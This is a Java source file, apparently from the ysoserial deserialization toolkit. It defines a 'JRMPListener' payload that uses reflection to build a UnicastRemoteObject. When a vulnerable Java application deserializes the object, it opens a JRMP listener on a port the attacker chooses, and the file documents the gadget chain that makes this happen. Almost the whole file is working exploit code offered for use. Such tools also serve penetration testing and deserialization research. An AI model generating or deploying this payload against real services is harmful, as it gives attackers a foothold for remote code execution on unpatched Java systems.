/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 22.01.2016 by mbechler
 */
package ysoserial.payloads;


import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import sun.reflect.ReflectionFactory;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;
import ysoserial.payloads.util.PayloadRunner;


/**
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
 * 
 * Requires:
 * - JavaSE
 * 
 * Argument:
 * - Port number to open listener to
 */
@SuppressWarnings ( {
    "restriction", "nls", "javadoc"
} )
public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {

    public UnicastRemoteObject getObject ( final String command ) throws Exception {
        int jrmpPort = Integer.parseInt(command);
        Constructor<RemoteObject> uroC = RemoteObject.class.getDeclaredConstructor(RemoteRef.class);
        uroC.setAccessible(true);
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Constructor<?> sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);
        sc.setAccessible(true);
        UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance(new UnicastServerRef(jrmpPort));

        Field portF = UnicastRemoteObject.class.getDeclaredField("port");
        portF.setAccessible(true);
        portF.set(uro, jrmpPort);
        return uro;
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(JRMPListener.class, args);
    }
}
